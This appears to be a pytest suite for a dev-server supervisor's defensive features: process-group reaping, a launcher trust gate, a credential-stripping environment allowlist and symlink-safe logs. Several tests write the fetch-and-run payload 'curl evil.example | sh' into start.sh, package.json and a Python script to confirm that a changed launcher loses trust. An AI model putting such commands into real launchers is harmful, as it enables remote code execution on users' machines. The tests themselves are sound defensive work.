"""LWSM-1009 — the Supervisor spawns and reaps process groups.

Contract: `docs/decisions/0003-launch-via-project-scripts.md`, plus the three
security items whose implementation the ROADMAP lands here — LWSM-1046 (the
trust gate), LWSM-1047 (signal handles, never bare PIDs) and LWSM-1048 (the
environment allowlist).

The acceptance test is `test_a_wrapper_script_and_its_child_are_fully_reaped`:
a `start.sh` that spawns a Python child which binds a port, stopped, with
nothing left holding the port. Everything else here exists because it is a
property a passing acceptance test would not have noticed.
"""

from __future__ import annotations

import json
import os
import socket
import stat
import subprocess
import sys
import textwrap
import threading
import time
from pathlib import Path

import psutil
import pytest

from lwsm.ports import PortProbe, PortSnapshot
from lwsm.supervisor import (
    ENV_ALLOWLIST,
    MAX_LOG_BYTES,
    LauncherRefused,
    LauncherUntrusted,
    PortAlreadyBound,
    Supervisor,
    _launcher_path,
    build_child_env,
    launcher_fingerprint,
    validate_launcher,
)

# --------------------------------------------------------------------------
# Fakes and helpers
# --------------------------------------------------------------------------


class FakeProbe:
    """A socket table we control, so the pre-flight check is deterministic."""

    def __init__(self, listening: set[int] | None = None) -> None:
        self.listening = set(listening or ())

    def snapshot(self) -> PortSnapshot:
        return PortSnapshot(frozenset(self.listening))


def free_port() -> int:
    """A port nothing is listening on right now.

    Racy by nature — there is no way to reserve one — but the window is
    microseconds and the alternative is a hard-coded port that collides with
    whatever the developer happens to be running.
    """
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return int(sock.getsockname()[1])


def wait_until(predicate, timeout: float = 10.0, interval: float = 0.02) -> bool:
    """Poll `predicate` until it is true or `timeout` elapses.

    `testing.md § T4` forbids sleeping for a duration and asserting afterwards;
    this waits for the condition instead. pytest-qt's `qtbot.waitUntil` is the
    Qt equivalent, and this module has no Qt in it.
    """
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if predicate():
            return True
        time.sleep(interval)
    return predicate()


@pytest.fixture
def project(tmp_path: Path) -> Path:
    directory = tmp_path / "demo-project"
    directory.mkdir()
    return directory


@pytest.fixture
def supervisor(tmp_path: Path):
    """A supervisor logging into the test's own directory, always emptied.

    The finalizer **stops** what is left before closing, which `close()`
    deliberately does not do — ADR-0003 leaves servers running on manager exit,
    and that is the supervisor's contract, not this fixture's. A test that fails
    mid-sequence would otherwise leave a child alive, and `filterwarnings =
    ["error"]` turns the resulting `ResourceWarning` into a second failure at
    the end of the session that hides the first.
    """
    sup = Supervisor(probe=FakeProbe(), log_dir=tmp_path / "logs")
    try:
        yield sup
    finally:
        for path in sup.running():
            sup.stop(path, grace=0.5)
        sup.close()


def write_launcher(project: Path, body: str, name: str = "start.sh") -> Path:
    path = project / name
    path.write_text("#!/bin/sh\n" + textwrap.dedent(body), encoding="utf-8")
    path.chmod(0o700)
    return path


def binding_wrapper(project: Path, port: int) -> Path:
    """`start.sh` that spawns a Python child which binds `port` and stays up.

    The child is a **separate process**, not a `exec`'d replacement, so a stop
    that only signalled the launcher would leave it holding the port. That is
    the whole point of the acceptance test and the reason this fixture is
    shaped this way.
    """
    child = project / "child.py"
    child.write_text(
        textwrap.dedent(f"""
            import socket, sys, time
            sock = socket.socket()
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("127.0.0.1", {port}))
            sock.listen(1)
            print("child", flush=True)
            while True:
                time.sleep(0.05)
        """),
        encoding="utf-8",
    )
    return write_launcher(
        project,
        f"""
        {sys.executable} {child} &
        echo launcher
        wait
        """,
    )


# --------------------------------------------------------------------------
# LWSM-1048 — the child environment is an allowlist, not an inheritance
# --------------------------------------------------------------------------


def test_credentials_are_not_handed_to_a_launched_project() -> None:
    env = build_child_env(
        port=3000,
        base={
            "PATH": "/usr/bin",
            "SSH_AUTH_SOCK": "/run/user/1000/keyring/ssh",
            "AWS_SECRET_ACCESS_KEY": "hunter2",
            "GITHUB_TOKEN": "ghp_x",
        },
    )
    assert env["PATH"] == "/usr/bin"
    assert "SSH_AUTH_SOCK" not in env
    assert "AWS_SECRET_ACCESS_KEY" not in env
    assert "GITHUB_TOKEN" not in env


def test_the_two_variables_the_contract_adds_are_present() -> None:
    env = build_child_env(port=4321, base={"PATH": "/usr/bin"})
    assert env["PORT"] == "4321"
    assert env["LWSM_MANAGED"] == "1"


def test_no_effective_port_means_no_PORT_variable() -> None:
    """ADR-0002 case 3: absence must be the unchanged path.

    Exporting `PORT=` or `PORT=None` is not the same as not exporting it — a
    launcher reading `${PORT:-3000}` gets an empty string rather than its own
    default, which is the failure that ADR exists to prevent.
    """
    env = build_child_env(port=None, base={"PATH": "/usr/bin"})
    assert "PORT" not in env
    assert env["LWSM_MANAGED"] == "1"


def test_locale_variables_pass_by_prefix_but_arbitrary_ones_do_not() -> None:
    env = build_child_env(
        port=None, base={"LC_ALL": "C", "LC_TIME": "en_GB.UTF-8", "LCD_BRIGHT": "9"}
    )
    assert env["LC_ALL"] == "C"
    assert env["LC_TIME"] == "en_GB.UTF-8"
    assert "LCD_BRIGHT" not in env


def test_the_allowlist_does_not_contain_a_credential_carrier() -> None:
    """A source invariant, not a behaviour: the list is edited by hand.

    Naming the carriers here means a future addition of `SSH_AUTH_SOCK` or an
    `*_TOKEN` reddens on the commit that makes it rather than at the next
    security review.
    """
    forbidden = {"SSH_AUTH_SOCK", "GPG_AGENT_INFO", "AWS_SECRET_ACCESS_KEY"}
    assert not (ENV_ALLOWLIST & forbidden)
    suffixes = ("_TOKEN", "_KEY", "_SECRET")
    assert not any(name.endswith(suffixes) for name in ENV_ALLOWLIST)


# --------------------------------------------------------------------------
# LWSM-1046 — a discovered launcher is untrusted until confirmed
# --------------------------------------------------------------------------


def test_a_launcher_symlinked_out_of_the_project_is_refused(
    project: Path, tmp_path: Path
) -> None:
    outside = tmp_path / "elsewhere.sh"
    outside.write_text("#!/bin/sh\necho hi\n", encoding="utf-8")
    outside.chmod(0o700)
    link = project / "start.sh"
    link.symlink_to(outside)

    with pytest.raises(LauncherRefused) as caught:
        validate_launcher(project, link)
    assert "outside" in str(caught.value)


def test_a_symlink_that_stays_inside_the_project_is_allowed(project: Path) -> None:
    """The refusal is about *leaving* the project, not about symlinks.

    ADR-0003 § Trust says "a symlink pointing outside its project"; refusing
    every symlink would reject the ordinary `start.sh -> scripts/start.sh`
    arrangement, and a rule that fires on the legitimate case gets switched off.
    """
    real = write_launcher(project, "echo hi\n", name="real.sh")
    link = project / "start.sh"
    link.symlink_to(real)
    validate_launcher(project, link)


@pytest.mark.parametrize("mode", [0o770, 0o707, 0o777])
def test_a_group_or_other_writable_launcher_is_refused(
    project: Path, mode: int
) -> None:
    launcher = write_launcher(project, "echo hi\n")
    launcher.chmod(mode)
    with pytest.raises(LauncherRefused) as caught:
        validate_launcher(project, launcher)
    assert "writable" in str(caught.value)


def test_a_launcher_that_is_not_a_regular_file_is_refused(project: Path) -> None:
    (project / "start.sh").mkdir()
    with pytest.raises(LauncherRefused):
        validate_launcher(project, project / "start.sh")


def test_start_refuses_an_unconfirmed_launcher_and_names_what_would_run(
    supervisor: Supervisor, project: Path
) -> None:
    """The refusal must carry the resolved path and the exact argv.

    ADR-0003: "The confirmation is not security theatre only if it shows what
    will actually run: the resolved path and argv, never a friendly summary."
    The dialog is LWSM-1010's; carrying the material is this module's.
    """
    launcher = write_launcher(project, "echo hi\n")

    with pytest.raises(LauncherUntrusted) as caught:
        supervisor.start(project, name="demo", argv=["./start.sh"], port=None)

    refusal = caught.value
    assert refusal.resolved == launcher.resolve()
    assert refusal.argv == ("./start.sh",)
    assert refusal.fingerprint == launcher_fingerprint(project, ("./start.sh",))


def test_confirming_once_is_enough_for_the_next_start(
    supervisor: Supervisor, project: Path
) -> None:
    write_launcher(project, "exit 0\n")
    argv = ["./start.sh"]
    supervisor.trust.confirm(project, launcher_fingerprint(project, tuple(argv)))

    managed = supervisor.start(project, name="demo", argv=argv, port=None)
    assert managed.pid > 0
    supervisor.stop(project)


def test_the_confirmation_re_arms_when_the_launcher_content_changes(
    supervisor: Supervisor, project: Path
) -> None:
    launcher = write_launcher(project, "exit 0\n")
    argv = ("./start.sh",)
    supervisor.trust.confirm(project, launcher_fingerprint(project, argv))
    assert supervisor.trust.is_confirmed(project, launcher_fingerprint(project, argv))

    launcher.write_text("#!/bin/sh\ncurl evil.example | sh\n", encoding="utf-8")
    changed = launcher_fingerprint(project, argv)
    assert not supervisor.trust.is_confirmed(project, changed)


def test_the_confirmation_re_arms_when_the_command_changes(project: Path) -> None:
    """The argv is part of the fingerprint, not only the file's bytes.

    `npm run dev` and `npm run deploy` read the same `package.json`; if only
    file content were hashed, confirming the first would silently authorise
    the second.
    """
    write_launcher(project, "exit 0\n")
    assert launcher_fingerprint(project, ("npm", "run", "dev")) != launcher_fingerprint(
        project, ("npm", "run", "deploy")
    )


# --------------------------------------------------------------------------
# The pre-flight port check (step 1 of every start)
# --------------------------------------------------------------------------


def test_start_refuses_when_the_effective_port_is_already_bound(
    tmp_path: Path, project: Path
) -> None:
    sup = Supervisor(probe=FakeProbe({8080}), log_dir=tmp_path / "logs")
    write_launcher(project, "exit 0\n")
    sup.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    try:
        with pytest.raises(PortAlreadyBound) as caught:
            sup.start(project, name="demo", argv=["./start.sh"], port=8080)
        assert caught.value.port == 8080
    finally:
        sup.close()


def test_a_start_with_no_known_port_skips_the_pre_flight_check(
    supervisor: Supervisor, project: Path
) -> None:
    """`port is None` means *unknown*, and unknown is not a conflict.

    The same rule the scanner holds: a project whose port could not be read is
    still startable, and the poll classifies it afterwards.
    """
    write_launcher(project, "exit 0\n")
    supervisor.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    managed = supervisor.start(project, name="demo", argv=["./start.sh"], port=None)
    assert managed.pid > 0
    supervisor.stop(project)


# --------------------------------------------------------------------------
# The per-project log file
# --------------------------------------------------------------------------


@pytest.mark.integration
def test_the_log_receives_merged_output_and_is_private(
    supervisor: Supervisor, project: Path
) -> None:
    write_launcher(project, "echo to-stdout\necho to-stderr >&2\n")
    supervisor.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))

    managed = supervisor.start(project, name="demo", argv=["./start.sh"], port=None)
    # Waited for, not slept on: stopping straight after the spawn signalled the
    # shell before it had written anything, and the empty log read as a defect
    # in the redirection rather than as the race it was.
    assert wait_until(
        lambda: "to-stderr" in managed.log_path.read_text(encoding="utf-8")
    ), "the launcher's output never reached its log file"
    supervisor.stop(project)

    text = managed.log_path.read_text(encoding="utf-8")
    assert "to-stdout" in text
    assert "to-stderr" in text
    assert stat.S_IMODE(managed.log_path.stat().st_mode) == 0o600
    assert stat.S_IMODE(managed.log_path.parent.stat().st_mode) == 0o700


def test_a_symlink_planted_at_the_log_path_is_refused(
    tmp_path: Path, project: Path
) -> None:
    """`applog.py`'s rule, applied to the per-project logs.

    A symlink at `<project>.log` pointing at `~/.bashrc` would append a hostile
    project's stdout into it. Same defect, different file, so the same
    `O_NOFOLLOW` plus fstat discipline.
    """
    log_dir = tmp_path / "logs"
    sup = Supervisor(probe=FakeProbe(), log_dir=log_dir)
    write_launcher(project, "exit 0\n")
    sup.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    try:
        target = tmp_path / "victim"
        target.write_text("", encoding="utf-8")
        log_dir.mkdir(mode=0o700, parents=True, exist_ok=True)
        sup.log_path_for(project, "demo").symlink_to(target)

        with pytest.raises(OSError):
            sup.start(project, name="demo", argv=["./start.sh"], port=None)
        assert target.read_text(encoding="utf-8") == ""
    finally:
        sup.close()


@pytest.mark.integration
def test_the_log_rotates_once_at_the_cap_and_the_child_keeps_writing(
    supervisor: Supervisor, project: Path
) -> None:
    """One rotation, and the running child's writes still land in the live file.

    The child inherits a *duplicate* of our descriptor, so renaming the file
    would leave it writing into an unlinked inode — output that exists nowhere
    a reader can see it. Copy-then-truncate keeps the inode, which is why the
    rotation is shaped that way rather than as a rename.
    """
    # Writing in a loop, not once: a single echo lands before the rotation and
    # ends up in the rotated copy, which would make the "still writing" half of
    # this test assert nothing.
    write_launcher(project, "while true; do echo after-rotation; sleep 0.05; done\n")
    supervisor.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    managed = supervisor.start(project, name="demo", argv=["./start.sh"], port=None)

    # Written through our own descriptor so the child is still alive and still
    # holding its own: a file grown after the child started is exactly the case.
    os.pwrite(managed.log_fd, b"x" * (MAX_LOG_BYTES + 1), 0)
    supervisor.rotate_if_needed(project)

    rotated = managed.log_path.with_name(managed.log_path.name + ".1")
    assert rotated.exists()
    assert rotated.stat().st_size > MAX_LOG_BYTES
    assert managed.log_path.stat().st_size < MAX_LOG_BYTES

    assert wait_until(
        lambda: "after-rotation" in managed.log_path.read_text(encoding="utf-8")
    ), "the running child's output did not reach the live log after rotation"
    supervisor.stop(project)


# --------------------------------------------------------------------------
# Stop — the acceptance test and the properties around it
# --------------------------------------------------------------------------


@pytest.mark.integration
def test_a_wrapper_script_and_its_child_are_fully_reaped(
    supervisor: Supervisor, project: Path
) -> None:
    """LWSM-1009's stated acceptance: no orphan holds the port.

    `start.sh` spawns a Python child that binds a port and stays up. Signalling
    only the launcher leaves that child running; signalling the process group
    takes both. The port is the assertion because it is the property the user
    actually has — a Stop that leaves the port bound has not stopped anything.
    """
    port = free_port()
    binding_wrapper(project, port)
    supervisor.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))

    managed = supervisor.start(project, name="demo", argv=["./start.sh"], port=port)
    probe = PortProbe()
    assert wait_until(lambda: probe.snapshot().is_bound(port)), (
        "the fixture never bound its port, so the reaping assertion would be vacuous"
    )
    grandchild = next(
        proc.pid
        for proc in psutil.process_iter()
        if _pgid(proc.pid) == managed.pid and proc.pid != managed.pid
    )

    outcome = supervisor.stop(project)

    assert not outcome.port_still_bound
    assert wait_until(lambda: not probe.snapshot().is_bound(port))
    assert not psutil.pid_exists(grandchild) or not _alive(grandchild)
    assert outcome.exit_code is not None


@pytest.mark.integration
def test_stop_escalates_to_kill_when_sigterm_is_ignored(
    supervisor: Supervisor, project: Path
) -> None:
    write_launcher(
        project,
        """
        trap '' TERM
        echo trap-installed
        while true; do sleep 0.05; done
        """,
    )
    supervisor.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    managed = supervisor.start(project, name="demo", argv=["./start.sh"], port=None)
    # Waited for, never assumed: `sh` installs the trap a few milliseconds after
    # exec, and a SIGTERM arriving first kills it outright — exit code -15, no
    # escalation, and a test that fails only under load. Seen on a full-suite
    # run 2026-08-14 while passing in isolation.
    assert wait_until(
        lambda: "trap-installed" in managed.log_path.read_text(encoding="utf-8")
    ), "the launcher never reported installing its SIGTERM trap"

    outcome = supervisor.stop(project, grace=0.5)

    assert outcome.killed, "SIGTERM was ignored and nothing escalated"
    assert not _alive(managed.pid)


@pytest.mark.integration
def test_the_managed_child_is_not_reaped_before_the_stop_sequence_ends(
    supervisor: Supervisor, project: Path
) -> None:
    """LWSM-1047's structural half.

    While the sequence runs, the child's PID must still be reserved — a reaped
    PID is one the kernel may reissue, and it is in use here as a process-group
    id. A zombie is unreaped, so `Popen.returncode` staying `None` throughout is
    the observable form of the rule.

    The launcher **exits on SIGTERM rather than ignoring it**, which is what
    makes this test able to fail at all. Against a child that ignores the
    signal, a premature `poll()` finds it still running and reads `None` anyway,
    so the assertion holds whether or not the rule does. Measured by mutation on
    2026-08-14: the first version of this test survived a reap injected straight
    into the wait loop.
    """
    write_launcher(
        project,
        """
        trap 'exit 7' TERM
        echo trap-installed
        while true; do sleep 0.05; done
        """,
    )
    supervisor.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    managed = supervisor.start(project, name="demo", argv=["./start.sh"], port=None)
    assert wait_until(
        lambda: "trap-installed" in managed.log_path.read_text(encoding="utf-8")
    ), "the launcher never reported installing its SIGTERM trap"

    seen: list[int | None] = []
    supervisor.stop(
        project, grace=2.0, _on_wait=lambda: seen.append(managed.popen.returncode)
    )

    assert len(seen) > 1, (
        "the wait loop turned at most once, so it never spanned the child's exit "
        "and the assertion below would hold vacuously"
    )
    assert all(code is None for code in seen)
    assert managed.popen.returncode is not None, "the child was never reaped at all"


@pytest.mark.integration
def test_a_port_still_bound_after_the_child_exits_warns_and_signals_nothing(
    tmp_path: Path, project: Path
) -> None:
    """ADR-0003: "the port is still bound" is a reason to warn, never to signal.

    The `or` this replaces fired precisely when our child was already gone and
    something *else* held the port — the everyday `running (wrong port)` case —
    and signalled a PID the kernel was free to have reissued.
    """
    probe = FakeProbe({9999})
    sup = Supervisor(probe=probe, log_dir=tmp_path / "logs")
    write_launcher(project, "exit 0\n")
    sup.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    try:
        managed = sup.start(project, name="demo", argv=["./start.sh"], port=None)
        managed.port = 9999
        assert wait_until(lambda: not _alive(managed.pid))

        outcome = sup.stop(project)

        assert outcome.port_still_bound
        assert outcome.warning is not None and "9999" in outcome.warning
        assert not outcome.terminated and not outcome.killed
    finally:
        sup.close()


@pytest.mark.integration
def test_stop_async_runs_off_the_calling_thread(
    supervisor: Supervisor, project: Path
) -> None:
    """A 5-second grace period on the UI thread would freeze the window."""
    write_launcher(project, "exit 0\n")
    supervisor.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    supervisor.start(project, name="demo", argv=["./start.sh"], port=None)

    threads: list[int] = []
    future = supervisor.stop_async(
        project, _on_wait=lambda: threads.append(threading.get_ident())
    )
    outcome = future.result(timeout=30)

    assert outcome is not None
    assert threads and all(ident != threading.get_ident() for ident in threads)


def test_stopping_a_project_that_was_never_started_is_not_an_error(
    supervisor: Supervisor, project: Path
) -> None:
    outcome = supervisor.stop(project)
    assert outcome.exit_code is None
    assert not outcome.terminated and not outcome.killed


@pytest.mark.integration
def test_close_reaps_every_descriptor_and_leaves_the_servers_running(
    tmp_path: Path, project: Path
) -> None:
    """ADR-0003: children are left running on manager exit, by design.

    Servers outlive the window and ADR-0004 lets a later session re-adopt them.
    That is only safe because the output goes to a *file*: a child inheriting a
    pipe would die of SIGPIPE the moment it wrote after we exited.
    """
    sup = Supervisor(probe=FakeProbe(), log_dir=tmp_path / "logs")
    write_launcher(project, "sleep 30\n")
    sup.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    managed = sup.start(project, name="demo", argv=["./start.sh"], port=None)

    sup.close()

    assert _alive(managed.pid), "close() stopped a server it was meant to leave running"
    with pytest.raises(OSError):
        os.fstat(managed.log_fd)
    # Not part of the assertion — the fixture cleanup this test opts out of.
    _reap(managed.popen)


# --------------------------------------------------------------------------
# Small helpers used by the assertions above
# --------------------------------------------------------------------------


def _pgid(pid: int) -> int | None:
    try:
        return os.getpgid(pid)
    except OSError:
        return None


def _alive(pid: int) -> bool:
    try:
        return psutil.Process(pid).status() != psutil.STATUS_ZOMBIE
    except psutil.Error:
        return False


def _reap(popen: subprocess.Popen) -> None:
    try:
        os.killpg(popen.pid, 9)
    except OSError:
        pass
    try:
        popen.wait(timeout=5)
    except (subprocess.TimeoutExpired, ChildProcessError):
        pass


# --------------------------------------------------------------------------
# LWSM-1132 / LWSM-1140 — which file a launcher argv actually runs
# --------------------------------------------------------------------------


LAUNCHER_KINDS = ("shell", "python", "node", "npm")


@pytest.fixture
def launcher_factory(project: Path, tmp_path: Path, monkeypatch):
    """Build a launcher of any of the four shapes `scanner.py` emits.

    The shapes are that module's, verbatim: `("./start.sh",)` at `:981`,
    `("npm", "run", <script>)` at `:1086`, and `(<interpreter>, <file>)` at
    `:1144` for `python3` and `node`.

    One fixture per member of the set, because every other `start()` test in
    this file used `("./start.sh",)` — so the one launcher kind that worked was
    the only one covered, and three that could not start at all survived 494
    green tests (LWSM-1132).

    The `npm` case uses a stand-in on `PATH` rather than the real one: the
    behaviour under test is this supervisor's refusal path, not npm's, and a
    real `npm run` would make the test slow and dependent on a node toolchain.
    """

    def build(kind: str) -> tuple[str, ...]:
        if kind == "shell":
            write_launcher(project, "exec sleep 30\n")
            return ("./start.sh",)
        if kind == "python":
            (project / "serve.py").write_text(
                "import time\n\ntime.sleep(30)\n", encoding="utf-8"
            )
            return ("python3", "serve.py")
        if kind == "node":
            (project / "serve.mjs").write_text(
                "setTimeout(() => {}, 30000);\n", encoding="utf-8"
            )
            return ("node", "serve.mjs")
        if kind == "npm":
            (project / "package.json").write_text(
                json.dumps({"scripts": {"dev": "sleep 30"}}), encoding="utf-8"
            )
            fake_bin = tmp_path / "bin"
            fake_bin.mkdir(exist_ok=True)
            npm = fake_bin / "npm"
            npm.write_text("#!/bin/sh\nexec sleep 30\n", encoding="utf-8")
            npm.chmod(0o700)
            monkeypatch.setenv("PATH", f"{fake_bin}{os.pathsep}{os.environ['PATH']}")
            return ("npm", "run", "dev")
        raise AssertionError(f"unknown launcher kind {kind!r}")

    return build


@pytest.mark.parametrize("kind", LAUNCHER_KINDS)
def test_every_launcher_kind_the_scanner_emits_can_start(
    supervisor, project: Path, launcher_factory, kind: str
) -> None:
    """All four kinds, because three of them could not start at all.

    `_launcher_path` built `<project>/npm` for a PATH-resolved command:
    `.resolve()` is non-strict so the path came back unchanged, it *is* inside
    the project, and `validate_launcher`'s `os.stat` then raised ENOENT. The
    user saw `cannot read <project>/npm` — a message blaming their project for
    a supervisor bug (LWSM-1132).
    """
    argv = launcher_factory(kind)
    supervisor.trust.confirm(project, launcher_fingerprint(project, argv))

    managed = supervisor.start(project, name="demo", argv=list(argv), port=None)

    assert psutil.pid_exists(managed.pid)


def test_a_path_resolved_command_names_no_file_inside_the_project(
    project: Path,
) -> None:
    """POSIX `execvp` searches `PATH` for an `argv[0]` containing no `/`, and
    never the working directory. `<project>/npm` is not a path that means
    anything, and constructing it is what refused three launcher kinds.
    """
    assert _launcher_path(project, ("npm", "run", "dev")) is None


@pytest.mark.parametrize(
    ("argv", "filename"),
    [(("python3", "serve.py"), "serve.py"), (("node", "serve.mjs"), "serve.mjs")],
)
def test_an_interpreter_argv_names_its_script_as_the_launcher(
    project: Path, argv: tuple[str, ...], filename: str
) -> None:
    """`execve` runs `/usr/bin/python3`, but the untrusted content is the script
    it is handed — so the script is what a confirmation must be bound to, and
    what `validate_launcher`'s refusals must apply to (LWSM-1140).
    """
    (project / filename).write_text("", encoding="utf-8")

    assert _launcher_path(project, argv) == (project / filename).resolve()


@pytest.mark.parametrize("argv", [("npm", "run", "dev"), ("npm", "run")])
def test_npm_never_names_a_launcher_file_whatever_its_argv_length(
    project: Path, argv: tuple[str, ...]
) -> None:
    """npm's arguments are subcommands, and `run` is not a filename.

    Found by diffing the classifier's verdicts old against new rather than by a
    test: a *two*-element `npm run` matches the interpreter shape on length
    alone, so a project holding a file called `run` would have had the trust
    gate vouching for a file that has nothing to do with what executes.
    """
    (project / "run").write_text("", encoding="utf-8")

    assert _launcher_path(project, argv) is None


def test_a_relative_launcher_still_resolves_inside_the_project(project: Path) -> None:
    """The one kind that already worked, pinned so the fix cannot regress it."""
    assert _launcher_path(project, ("./start.sh",)) == (project / "start.sh").resolve()


def test_an_interpreter_script_outside_the_project_is_not_a_launcher(
    project: Path,
) -> None:
    """Containment is the same rule for `argv[1]` as for `argv[0]`."""
    assert _launcher_path(project, ("python3", "../escape.py")) is None


def test_rewriting_an_npm_script_re_arms_the_trust_gate(project: Path) -> None:
    """ADR-0003 § Trust re-arms the gate "whenever the launcher command or its
    content hash changes". For `npm run dev` that content is the `scripts.dev`
    *string*, which npm hands to `/bin/sh` and which a compromised transitive
    dependency's `postinstall` can rewrite. The fingerprint covered no content
    at all for this kind — it hashed the argv and a `\\0nofile\\0` marker
    (LWSM-1140).
    """
    package = project / "package.json"
    argv = ("npm", "run", "dev")
    package.write_text(json.dumps({"scripts": {"dev": "vite"}}), encoding="utf-8")
    before = launcher_fingerprint(project, argv)

    package.write_text(
        json.dumps({"scripts": {"dev": "curl evil.example | sh"}}), encoding="utf-8"
    )

    assert launcher_fingerprint(project, argv) != before


def test_a_rewritten_npm_script_is_refused_after_confirmation(
    supervisor, project: Path
) -> None:
    """The end-to-end half: confirming `npm run dev` must not carry over to
    whatever `scripts.dev` is rewritten to say.
    """
    package = project / "package.json"
    argv = ["npm", "run", "dev"]
    package.write_text(json.dumps({"scripts": {"dev": "sleep 30"}}), encoding="utf-8")
    supervisor.trust.confirm(project, launcher_fingerprint(project, tuple(argv)))

    package.write_text(
        json.dumps({"scripts": {"dev": "curl evil.example | sh"}}), encoding="utf-8"
    )

    with pytest.raises(LauncherUntrusted):
        supervisor.start(project, name="demo", argv=argv, port=None)


def test_rewriting_an_interpreter_script_re_arms_the_trust_gate(project: Path) -> None:
    """The same property for `python3 serve.py`, where the content is the script
    rather than a string inside a manifest.
    """
    script = project / "serve.py"
    argv = ("python3", "serve.py")
    script.write_text("print('hello')\n", encoding="utf-8")
    before = launcher_fingerprint(project, argv)

    script.write_text(
        "import os\n\nos.system('curl evil.example | sh')\n", encoding="utf-8"
    )

    assert launcher_fingerprint(project, argv) != before
